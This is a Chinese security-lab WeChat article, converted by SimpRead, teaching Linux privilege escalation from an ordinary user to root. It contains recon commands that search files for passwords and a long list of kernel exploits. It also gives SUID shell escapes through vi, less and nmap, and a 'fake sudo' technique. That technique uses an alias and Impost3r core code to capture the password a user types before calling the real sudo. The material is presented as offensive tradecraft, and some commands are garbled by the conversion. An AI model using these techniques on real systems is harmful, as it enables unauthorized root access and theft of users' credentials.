> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/k12Kxjq2u1HjiWyAtwFNDA)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWaibibcHiayXtHHdrBKSyI4zXaT4qcYAM8DEibW3KmP6IXhv5bAqSbmuQ3qXorursuzqplGKk8kGwqMDHA/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)

喜欢就关注我吧，订阅更多最新安全知识

  

******文章来源｜MS08067 内网安全知识************星球******  

> 本文作者：****非正常接触****（Ms08067内网安全小组成员）  

**********内网纵横四海  认准Ms08067  
**********

![图片](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9zFRlVfhOz98FTo6NtLvuvMP8liaGgf3UrcK6zk8YEMkAgGQlzMJvvEpT62cygia1ial9VHptn8pTmA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这里介绍一些Linux提权（普通用户到root）手法。除了常见的内核漏洞、suid等提权手段外，还介绍一种通过伪装sudo命令来获取管理员口令的方法。

  

**0x00 常⻅信息收集命令**

  

<table width="100%"><tbody><tr><td style="margin: 5px 10px;" valign="top">命令</td><td style="margin: 5px 10px;" valign="top">结果</td></tr><tr><td style="margin: 5px 10px;" valign="top"><p>uname -a</p></td><td style="margin: 5px 10px;" valign="top">打印所有可⽤的系统信息</td></tr><tr><td style="margin: 5px 10px;" valign="top">cat /proc/version</td><td style="margin: 5px 10px;" valign="top">内核版本信息</td></tr><tr><td style="margin: 5px 10px;" valign="top">cat /etc/*-release(issues)</td><td style="margin: 5px 10px;" valign="top">Linux发行版本信息</td></tr><tr><td style="margin: 5px 10px;" valign="top">df -a</td><td style="margin: 5px 10px;" valign="top">文件系统信息</td></tr><tr><td style="margin: 5px 10px;" valign="top"><p>dpkg --list 2&gt;/dev/null| grep compiler |grep&nbsp;</p><p>-v decompiler</p><p>&nbsp;2&gt;/dev/null &amp;&amp; yum list installed 'gcc*'</p><p>&nbsp;2&gt;/dev/null| grep gcc</p><p>&nbsp;2&gt;/dev/null</p></td><td style="margin: 5px 10px;" valign="top">列出可用的编辑器</td></tr><tr><td style="margin: 5px 10px;" valign="top">lpstat -a</td><td style="margin: 5px 10px;" valign="top">查看是否有打印机</td></tr><tr><td style="margin: 5px 10px;" valign="top"><p>ps aux</p><p>top cat</p><p>/etc/service</p></td><td style="margin: 5px 10px;" valign="top">查看进程相关信息</td></tr><tr><td style="margin: 5px 10px;" valign="top"><p>crontab -l</p><p>ls -alh /var/spool/cron</p><p>ls -al /etc/ | grep cron</p><p>ls -al /etc/cron*</p><p>cat /etc/cron*</p><p>cat /etc/at.allow</p><p>cat /etc/at.deny</p><p>cat /etc/cron.allow</p><p>cat /etc/cron.deny</p><p>cat /etc/crontab</p><p>cat /etc/anacrontab</p><p>cat /var/spool/cron/crontabs/root</p></td><td style="margin: 5px 10px;" valign="top">查看计划任务的相关信息</td></tr><tr><td style="margin: 5px 10px;" valign="top"><p>grep -i user [filename]</p><p>grep -i pass [filename]</p><p>grep -C 5 “password” [filename]</p><p>find . -name “*.php” -print0 | xargs -0 grep</p><p>-i -n “var $password”</p></td><td style="margin: 5px 10px;" valign="top">查看可能具有⼝令的⽂件</td></tr></tbody></table>

**0x01 sudo滥⽤提权**

使⽤sudo -l命令可以查看当前⽤户允许执⾏的提权命令。

**0x02  内核漏洞提权**

Linux漏洞汇总（通过ExDB查找PoC）

<table width="100%"><tbody><tr><td style="margin: 5px 10px;" valign="top">发布时间</td><td style="margin: 5px 10px;" valign="top">漏洞描述</td><td style="margin: 5px 10px;" valign="top">发布作者</td></tr><tr><td style="margin: 5px 10px;" valign="top">2019/12/16</td><td style="margin: 5px 10px;" valign="top"><p>Linux 5.3 - Privilege</p><p>Escalation via io_uring</p><p>Offload of sendmsg() onto</p><p>Kernel Thread with Kernel</p><p>Creds</p></td><td style="margin: 5px 10px;" valign="top"><p>Google Security Research</p></td></tr><tr><td style="margin: 5px 10px;" valign="top">2019/10/24</td><td style="margin: 5px 10px;" valign="top"><p>Linux Polkit - pkexec helper</p><p>PTRACE_TRACEME local</p><p>root (Metasploit)</p></td><td style="margin: 5px 10px;" valign="top">Metasploit</td></tr><tr><td style="margin: 5px 10px;" valign="top">2019/07/17</td><td style="margin: 5px 10px;" valign="top"><p>Linux - Broken Permission</p><p>and Object Lifetime Handling</p><p>for PTRACE_TRACEME</p></td><td style="margin: 5px 10px;" valign="top">Google Security Research</td></tr><tr><td style="margin: 5px 10px;" valign="top">2018/11/29</td><td style="margin: 5px 10px;" valign="top"><p>Linux - Nested User</p><p>Namespace idmap Limit</p><p>Local Privilege Escalation</p><p>(Metasploit)</p></td><td style="margin: 5px 10px;" valign="top">Metasploit</td></tr><tr><td style="margin: 5px 10px;" valign="top">2018/11/16</td><td style="margin: 5px 10px;" valign="top"><p>Linux - Broken uid/gid</p><p>Mapping for Nested User</p><p>Namespaces</p></td><td style="margin: 5px 10px;" valign="top">Google Security Research</td></tr><tr><td style="margin: 5px 10px;" valign="top">2018/09/26</td><td style="margin: 5px 10px;" valign="top"><p>Linux Kernel - VMA Use-</p><p>After-Free via Buggy</p><p>vmacache_flush_all()</p><p>Fastpath Local Privilege</p><p>Escalation</p></td><td style="margin: 5px 10px;" valign="top">Google Security Research</td></tr><tr><td style="margin: 5px 10px;" valign="top"><p>2018/08/03</p></td><td style="margin: 5px 10px;" valign="top"><p>Linux Kernel - UDP</p><p>Fragmentation Offset 'UFO'</p><p>Privilege Escalation</p><p>(Metasploit)</p></td><td style="margin: 5px 10px;" valign="top">Metasploit</td></tr><tr><td style="margin: 5px 10px;" valign="top">2018/07/19</td><td style="margin: 5px 10px;" valign="top"><p>Linux - BPF Sign Extension</p><p>Local Privilege Escalation</p><p>(Metasploit)</p></td><td style="margin: 5px 10px;" valign="top">Metasploit</td></tr><tr><td style="margin: 5px 10px;" valign="top">2018/07/10</td><td style="margin: 5px 10px;" valign="top"><p>Linux Kernel &lt; 4.13.9</p><p>(Ubuntu 16.04 / Fedora 27) -</p><p>Local Privilege Escalation</p></td><td style="margin: 5px 10px;" valign="top">rlarabee</td></tr></tbody></table>
| 2018/05/22 | 

Linux 4.4.0 < 4.4.0-53 -

'AF_PACKET chocobo_root'

Local Privilege Escalation

(Metasploit)

 | Metasploit |
| 2018/05/21 | 

Linux 2.6.30 < 2.6.36-rc8 -

Reliable Datagram Sockets

(RDS) Privilege Escalation

(Metasploit)

 | Metasploit |
| 2018/05/18 | 

Linux 4.8.0 < 4.8.0-46 -

AF_PACKET packet_set_ring

Privilege Escalation

(Metasploit)

 | Metasploit |
| 2017/08/13 | 

Linux Kernel < 4.4.0-83 / <

4.8.0-58 (Ubuntu

14.04/16.04) - Local

Privilege Escalation (KASLR

/ SMEP)

 | Andrey Konovalov |
| 2017/09/06 | 

Tor (Linux) - X11 Linux

Sandbox Breakout

 | Google Security Research |
| 2017/05/22 | 

VMware Workstation for

Linux 12.5.2 build-4638234

- ALSA Configuration Host

Local Privilege Escalation

 |   
 |
| 2017/05/11 | 

Linux Kernel 4.8.0-41-

generic (Ubuntu) - Packet

Socket Local Privilege

Escalation

 | Andrey Konovalov |
| 2016/11/27 | 

Linux Kernel 2.6.22 < 3.9 -

'Dirty COW /proc/self/mem'

Race Condition Privilege

Escalation (/etc/passwd

Method)

 | Gabriele Bonacini |
| 2016/11/28 | 

Linux Kernel 2.6.22 < 3.9 -

'Dirty COW'

'PTRACE_POKEDATA' Race

Condition Privilege

Escalation (/etc/passwd

Method)

 | FireFart |
| 2016/11/14 | 

Linux Kernel 4.4 (Ubuntu

16.04) - 'BPF' Local Privilege

Escalation (Metasploit)

 | Metasploit |
| 2016/11/02 | 

Linux Kernel (Ubuntu /

Fedora / RedHat) -

'Overlayfs' Local Privilege

Escalation (Metasploit)

 | Metasploit |
| 2016/10/21 | 

Linux Kernel 2.6.22 < 3.9

(x86/x64) - 'Dirty COW

/proc/self/mem' Race

Condition Privilege

Escalation (SUID Method)

 | Robin Verton |
| 2016/10/19 | 

Linux Kernel 2.6.22 < 3.9 -

'Dirty COW' /proc/self/mem

Race Condition (Write

Access Method)

 | Phil Oester |
| 2016/10/11 | 

Linux Kernel 3.13.1 -

'Recvmmsg' Local Privilege

Escalation (Metasploit)

 | Metasploit |
| 2016/06/21 | 

Linux Kernel - 'ecryptfs'

'/proc/$pid/environ' Local

Privilege Escalation

 | Google Security Research |
| 2016/05/04 | 

Linux Kernel 4.4.x (Ubuntu

16.04) - 'double-fdput()'

bpf(BPF_PROG_LOAD)

Privilege Escalation

 | Google Security Research |
| 2016/05/04 | 

Linux Kernel (Ubuntu

14.04.3) -

'perf_event_open()' Can Race

with execve() (Access

/etc/shadow)

 | Google Security Research |
| 2014/05/28 | 

Linux Kernel 3.3.5 -

'/drivers/media/media-

device.c' Local Information

Disclosure

 | Salva Peiro |
| 2016/01/05 | 

Linux Kernel 4.3.3 (Ubuntu

14.04/15.10) - 'overlayfs'

Local Privilege Escalation (1)

 | rebel |
| 2013/06/07 | 

Linux Kernel 3.3.5 - 'b43'

Wireless Driver Privilege

Escalation

 | Kees Cook |
| 2015/10/15 | 

Linux Kernel 3.17 - 'Python

ctypes and memfd_create'

noexec File Security Bypass

 | soyer |
| 2013/03/13 | 

Linux Kernel 3.0 < 3.3.5 -

'CLONE_NEWUSER|CLONE_F

S' Local Privilege Escalation

 | Sebastian Krahmer |
| 2012/10/09 | 

Linux Kernel 3.2.x -

'uname()' System Call Local

Information Disclosure

 | Brad Spengler |
| 2012/07/26 | 

Linux Kernel 2.6.x -

'rds_recvmsg()' Local

Information Disclosure

 | Jay Fenlason |
| 2015/06/16 | 

Linux Kernel 3.13.0 < 3.19

(Ubuntu

12.04/14.04/14.10/15.04) -

'overlayfs' Local Privilege

Escalation (Access

/etc/shadow)

 |   
 |
| 2015/06/16 | 

Linux Kernel 3.13.0 < 3.19

(Ubuntu

12.04/14.04/14.10/15.04) -

'overlayfs' Local Privilege

Escalation

 | rebel |
| 2011/11/07 | 

Linux Kernel 3.0.4 -

'/proc/interrupts' Password

Length Local Information

Disclosure

 | Vasiliy Kulikov |
| 2012/01/12 | 

Linux Kernel 2.6.39 < 3.2.2

(x86/x64) - 'Mempodipper'

Local Privilege Escalation (2)

 | zx2c4 |
| 2014/10/20 | 

Linux PolicyKit - Race

Condition Privilege

Escalation (Metasploit)

 | Metasploit |
| 2010/11/09 | 

Linux Kernel 2.6.x -

'net/core/filter.c' Local

Information Disclosure

 | Dan Rosenberg |
| 2010/05/18 | 

Linux Kernel 2.6.x - Btrfs

Cloned File Security Bypass

 | Dan Rosenberg |
| 2014/06/21 | 

Linux Kernel 3.13 - SGID

Privilege Escalation

 | Vitaly Nikolenko |
| 2009/12/16 | 

Linux Kernel < 2.6.28 -

'fasync_helper()' Local

Privilege Escalation

 | Tavis Ormandy |
| 2009/11/09 | 

Linux Kernel 2.6.x - Ext4

'move extents' ioctl Privilege

Escalation

 | Akira Fujita |
| 2013/02/24 | 

Linux Kernel 3.3 < 3.8

(Ubuntu / Fedora 18) -

'sock_diag_handlers()' Local

Privilege Escalation (3)

 | SynQ |
| 2009/11/03 | 

Linux Kernel 2.6.x - 'pipe.c'

Local Privilege Escalation (2)

 | teach & xipe |
| 2009/11/03 | 

Linux Kernel 2.6.0 < 2.6.31 -

'pipe.c' Local Privilege

Escalation (1)

 | teach & xipe |
| 2009/03/02 | 

Linux Kernel 2.6.x -

'seccomp' System Call

Security Bypass

 | Chris Evans |
| 2009/02/20 | 

Linux Kernel 2.6.x - 'sock.c'

SO_BSDCOMPAT Option

Information Disclosure

 | Clément Lecigne |
| 2014/02/02 | 

Linux Kernel 3.4 < 3.13.2

(Ubuntu 13.10) -

'CONFIG_X86_X32' Arbitrary

Write (2)

 | saelo |
| 2007/9/21 | 

Linux Kernel 2.6.x - ALSA

snd-page-alloc Local Proc

File Information Disclosure

  


 | Karimo_DM |
| 2007/9/21 | 

Linux Kernel 2.6.x - Ptrace

Privilege Escalation

 | Wojciech Purczynski |
| 2007/03/05 | 

Linux Kernel 2.6.17 -

'Sys_Tee' Local Privilege

Escalation

 | Michael Kerrisk |
| 2006/07/27 | 

Linux-HA Heartbeat

1.2.3/2.0.x - Insecure

Default Permissions on

Shared Memory

 | anonymous |
| 2006/04/28 | 

Linux Kernel 2.6.x - CIFS

CHRoot Security Restriction

Bypass

 | Marcel Holtmann |
| 2006/04/28 | 

Linux Kernel 2.6.x - SMBFS

CHRoot Security Restriction

Bypass

 | Marcel Holtmann |
| 2006/03/23 | 

Linux Kernel

2.4.x/2.5.x/2.6.x -

'Sockaddr_In.Sin_Zero'

Kernel Memory Disclosure

 | Pavel Kankovsky |
| 2005/10/17 | 

Linux Kernel 2.6 - Console

Keymap Local Command

Injection

 | Rudolf Polzer |
| 2005/05/26 | 

Linux Kernel 2.6.x -

Cryptoloop Information

Disclosure

 | Markku-JuhaniO. Saarinen |
| 2005/10/19 | 

Linux Kernel 2.4.30/2.6.11.5

- BlueTooth

'bluez_sock_create' Local

Privilege Escalation

 | backdoored.net |
| 2005/04/08 | 

Linux Kernel 2.4.x/2.6.x -

BlueTooth Signed Buffer

Index Privilege Escalation (1)

 | qobaiashi |
| 2005/03/09 | 

Linux Kernel 2.6.x -

'SYS_EPoll_Wait' Local

Integer Overflow / Local

Privilege Escalation (1)

 | sd |
| 2004/04/23 | 

Linux Kernel 2.5.x/2.6.x -

CPUFreq Proc Handler

Integer Handling Memory

Read

 | Brad Spengler |
| 2004/02/09 | 

Samba 2.2.8 (Linux Kernel

2.6 / Debian / Mandrake) -

Share Privilege Escalation

 | Martin Fiala |
| 2004/02/06 | 

Linux VServer Project 1.2x -

Chroot Breakout

 | Markus Mueller |
| 2003/10/06 | 

SuSE Linux Professional 8.2

- SuSEWM Configuration

File Insecure Temporary File

 | Nash Leon |
| 2003/09/09 | 

RealOne Player for Linux 2.2

Alpha - Insecure

Configuration File

Permission Privilege

Escalation

 | Jon Hart |
| 2012/12/02 | 

MySQL (Linux) - Database

Privilege Escalation

 | kingcope |
| 2003/06/26 | 

Linux Kernel 2.4 - SUID

'execve()' System Call Race

Condition Executable File

Read

 | IhaQueR |
| 2003/06/20 | 

Linux Kernel 2.2.x/2.4.x -

'/proc' Filesystem

Information Disclosure

 | IhaQueR |
| 2003/06/16 | 

Linux PAM 0.77 -

Pam_Wheel Module

'getlogin() Username'

Spoofing Privilege Escalation

 | Karol Wiesek |
| 2003/02/18 | 

Linux-ATM LES 2.4 -

Command Line Argument

Buffer Overflow

 | Angelo Rosiello |
| 2003/04/04 | 

Linux Kernel 2.2.x/2.4.x -

I/O System Call File

Existence

 | Andrew Griffiths |
| 2003/04/10 | 

Linux Kernel 2.2.x/2.4.x -

Privileged Process Hijacking

Privilege Escalation (2)

 | Wojciech Purczynski |
| 2003/03/17 | 

Linux Kernel 2.2.x/2.4.x -

Privileged Process Hijacking

Privilege Escalation (1)

 | anszom@v-lo.krakow.pl |
| 2012/10/10 | 

Linux Kernel UDEV < 1.4.1 -

'Netlink' Local Privilege

Escalation (Metasploit)

 | Metasploit |
| 2002/08/28 | 

Linuxconf 1.1.x/1.2.x - Local

Environment Variable Buffer

Overflow (3)

 | syscalls |
| 2002/08/28 | 

Linuxconf 1.1.x/1.2.x - Local

Environment Variable Buffer

Overflow (2)

 | David Endler |
| 2002/08/28 | 

Linuxconf 1.1.x/1.2.x - Local

Environment Variable Buffer

Overflow (1)

 | RaiSe |
| 2002/08/10 | 

ISDN4Linux 3.1 - IPPPD

Device String SysLog Format

String (2)

 | TESO Security |
| 2002/08/10 | 

ISDN4Linux 3.1 - IPPPD

Device String SysLog Format

String (1)

 | Gobbles Security |
| 2002/05/17 | 

Grsecurity Kernel Patch 1.9.4

(Linux Kernel) - Memory

Protection

 | Guillaume PELAT |
| 2002/03/26 | 

Linux Kernel 2.2.x/2.3/2.4.x

- 'd_path()' Path Truncation

 | cliph |
| 2002/02/25 | 

Century Software Term For

Linux 6.27.869 - Command

Line Buffer Overflow

 | Haiku Hacker |
| 2000/08/25 | 

User-Mode Linux (Linux

Kernel 2.4.17-8) - Memory

Access Privilege Escalation

 | Andrew Griffiths |
| 2001/11/21 | 

SuSE Linux 6.4/7.0/7.1/7.2

Berkeley Parallel Make -

Local Buffer Overflow

 | IhaQueR@IRCnet |
| 2001/11/21 | 

SuSE Linux 6.4/7.0/7.1/7.2

Berkeley Parallel Make -

Shell Definition Format

String

 | IhaQueR@IRCnet |
| 2001/10/18 | 

Linux Kernel 2.2/2.4 -

Ptrace/Setuid Exec Privilege

Escalation

 | Rafal Wojtczuk |
| 2001/06/27 | 

Linux Kernel 2.2/2.4 -

procfs Stream redirection to

Process Memory Privilege

Escalation

 |   
 |
| 2001/06/12 | 

Linux Man Page

6.1/6.2/7.0/7.1- Source

Buffer Overflow

 | zen-parse |
| 2001/05/13 | 

Immunix OS 6.2/7.0 /

RedHat 5.2/6.2/7.0 / SuSE

Linux 6.x/7.0/7.1 - 'Man -S'

Heap Overflow

 | zenith parsec |
| 2001/03/27 | 

Linux Kernel 2.2.18 (RedHat

6.2/7.0 /

2.2.14/2.2.18/2.2.18ow4) -

ptrace/execve Race

Condition Privilege

Escalation (2)

 | Wojciech Purczynski |
| 2001/03/27 | 

Linux Kernel 2.2.18 (RedHat

6.2/7.0 /

2.2.14/2.2.18/2.2.18ow4) -

ptrace/execve Race

Condition Privilege

Escalation (1)

 | Wojciech Purczynski |
| 2001/02/09 | 

Linux Kernel 2.2.x - 'sysctl()'

Memory Reading

 | Chris Evans |
| 2000/11/30 | 

Linux Kernel 2.2.x - Non-

Readable File Ptrace Local

Information Leak

 | Lamagra Argamal |
| 2000/11/12 | 

Linux modutils 2.3.9 -

'modprobe' Arbitrary

Command Execution

 | Michal Zalewski |
| 2000/06/07 | 

Linux Kernel 2.2.x 2.4.0-

test1 (SGI ProPack 1.2/1.3) -

Sendmail 8.10.1 Capabilities

Privilege Escalation (2)

 | Wojciech Purczynski |
| 2000/06/07 | 

Linux Kernel 2.2.x 2.4.0-

test1 (SGI ProPack 1.2/1.3) -

Sendmail Capabilities

Privilege Escalation(1)

 | Florian Heinz |
| 2000/05/29 | 

Mandriva Linux Mandrake 7.0

- Local Buffer Overflow

 | noir |
| 2000/05/22 | 

S.u.S.E Linux 4.x/5.x/6.x/7.0

/ Slackware 3.x/4.0 /

Turbolinux 6 / OpenLinux 7.0

- 'fdmount' Local Buffer

Overflow (3)

 | WaR |
| 2000/05/22 | 

S.u.S.E Linux 4.x/5.x/6.x/7.0

/ Slackware 3.x/4.0 /

Turbolinux 6 / OpenLinux 7.0

- 'fdmount' Local Buffer

Overflow (2)

 | Scrippie |
| 2000/05/22 | 

S.u.S.E Linux 4.x/5.x/6.x/7.0

/ Slackware 3.x/4.0 /

Turbolinux 6 / OpenLinux 7.0

- 'fdmount' Local Buffer

Overflow (1)

 | Paulo Ribeiro |
| 2012/07/19 | 

Linux Kernel 2.4.4 < 2.4.37.4

/ 2.6.0 < 2.6.30.4 -

'Sendpage' Local Privilege

Escalation (Metasploit)

 | Metasploit |
| 2000/05/03 | 

RedHat Linux 6.0/6.1/6.2 -

'pam_console' Monitor

Activity After Logout

 | Michal Zalewski |
| 2000/04/29 | 

SuSE Linux 6.3/6.4 Gnomelib

- Local Buffer Overflow

 | bladi |
| 2000/04/21 | 

SuSE Linux 6.x - Arbitrary

File Deletion

 | Peter_M |
| 2000/04/10 | 

Bray Systems Linux Trustees

1.5 - Long Pathname

 | Andrey E. Lerman |
| 2000/03/16 | 

Halloween Linux 4.0 / SuSE

Linux 6.0/6.1/6.2/6.3 -

'kreatecd' Local Privilege

Escalation

 | Sebastian |
| 2000/03/13 | 

Halloween Linux 4.0 /

RedHat Linux 6.1/6.2 -

'imwheel' (2)

 | S.Krahmer & Stealth |
| 2000/03/13 | 

Halloween Linux 4.0 /

RedHat Linux 6.1/6.2 -

'imwheel' (1)

 | funkysh |
| 2000/03/11 | 

AT Computing atsar_linux 1.4

- File Manipulation

 | S. Krahmer |
| 2000/03/05 | 

Oracle8i Standard Edition

8.1.5 for Linux Installer -

Local Privilege Escalation

 | Keyser Soze |
| 2000/03/02 | 

Corel Linux OS 1.0 - Dosemu

Distribution Configuration

 | suid |
| 2000/02/26 | 

RedHat 4.x/5.x/6.x / RedHat

man 1.5 / Turbolinux man 1.5

/ Turbolinux 3.5/4.x - 'man'

Buffer Overrun (2)

 | Babcia Padlina |
| 2000/02/26 | 

RedHat 4.x/5.x/6.x / RedHat

man 1.5 / Turbolinux man 1.5

/ Turbolinux 3.5/4.x - 'man'

Buffer Overrun (1)

 | Babcia Padlina |
| 2000/02/24 | 

Corel Linux OS 1.0 -

'setxconf' Local Privilege

Escalation

 | suid |
| 2000/02/24 | 

Corel Linux OS 1.0 -

buildxconfig

 | suid |
| 2000/02/23 | 

RedHat Linux 6.0 - Single

User Mode Authentication

 | Darren Reed |
| 2000/01/12 | 

Corel Linux OS 1.0 - get_it

PATH

 | Cesar Tascon Alvarez |
| 2000/03/15 | 

Mandrake 6.x / RedHat 6.x /

Turbolinux 3.5 b2/4.x/6.0.2

userhelper/PAM - Path (2)

 | Elias Levy |

⽐较常⽤的漏洞：

CVE-2016-5195: 脏⽜漏洞

CVE-2019-14287: sudo溢出漏洞

可以通过⾃动化脚本来匹配相关的内核漏洞：

```
`https://github.com/rebootuser/LinEnum` `https://github.com/mzet-/linux-exploit-suggester`
```

  

**0x03 suid提权**

suid允许⽤户在执⾏⽤户的许可下执⾏⽂件，创建和打开⽹络套接字⼀般需要root权限，但是为了⽅便使 ⽤，如Ping命令，通过设置Ping程序的suid，就可以允许低权限⽤户执⾏Ping程序时是以root权限执⾏。因此，如果⼀个程序中设置了suid，我们可以该程序⽣成的shell来提升权限。

**查找suid和guid⽂件**

```
`find / -perm -u=s -type f 2>/dev/null``find / -perm -g=s -type f 2>/dev/n`
```

ull  

**其它可⽤的命令**

**查找密钥或者证书:**

```
find / -type f '(' -name .cert -or -name .crt -or -name .pem -or name .ca -or -name .p12 -or -name .cer -name *.der ')' '(' '(' -us er support -perm -u=r ')' -or '(' -group support -perm -g=r ')' -o r '(' -perm -o=r ')' ')' 2> /dev/null-or -name .cer -name .der ')' 2> /dev/nu
```

**查找root拥有的suid⽂件**

```
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

**例⼦**

**vi / vim**

```
`:set shell=/bin/sh``:shell`
```

**less**

```
`less /etc/passwd``!/bin/sh`
```

**nmap**  

```
`nmap -interactive``! sh`
```

**0x04 伪造sudo**

Linux下命令执⾏顺序可以由⽤户决定，如改变.bashrc中的环境变量信息，也可以给某命令增加⼀个别名 等。可以伪造⼀个sudo命令，让⽤户每次输⼊的⼝令都存储下来，达到提权的⽬的。这⾥推荐Impost3r项⽬

  

**创建sudo别名**

```
`alias sudo='impost3r() {``if [ -f "/tmp/.impost3r" ]; then``/tmp/.impost3r "$@" && unalias sudo``else``unalias sudo;sudo "$@"``fi``}; impost3r'`
```

**impost3r核⼼代码**

```
`int pid = fork();``if (pid == 0)``{``successFlag = 0;``save_passwd(usrInfo->pw_name,originPasswd,allPasswd,1);``return allPasswd;``}``else``{``wait(NULL); // 防⽌⽤户执⾏的是⽆限循环服务，从⽽产⽣僵⼫进程``execv("/usr/bin/sudo",params);``exit(0);``}`
```

```
将⽤户输⼊的⼝令信息先通过 save_passwd 存储下来，然后再调⽤真实的sudo命令。
```

**0x05  其它提权⼿法**

1.LXD提权

2.cronjob计划任务提权

3.NFS提权

4.⼝令爆破提权

  

 ![Ms08067安全实验室](http://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9xKtQcyickhdgvJx9bWxpSjSqS4AwI7o804CbiazVQqTnMibp7ZC6fyxmJ7kgfMyA2rHgHkShs3M7bA/0?wx_fmt=png) ** Ms08067安全实验室 ** 实验室致力于网络安全的普及和培训，已出版《Web安全攻防：渗透测试实战指南》《内网安全攻防：渗透测试实战指南》《Python安全攻防：渗透测试实战指南》《Java代码安全审计（入门篇）》等图书。www.ms08067.com 300篇原创内容   公众号

  

  

  

扫描下方二维码加入星球学习

加入后邀请进入内部微信群，内部微信群永久有效！

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==) ![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==) ![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

目前36000+人已关注加入我们

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)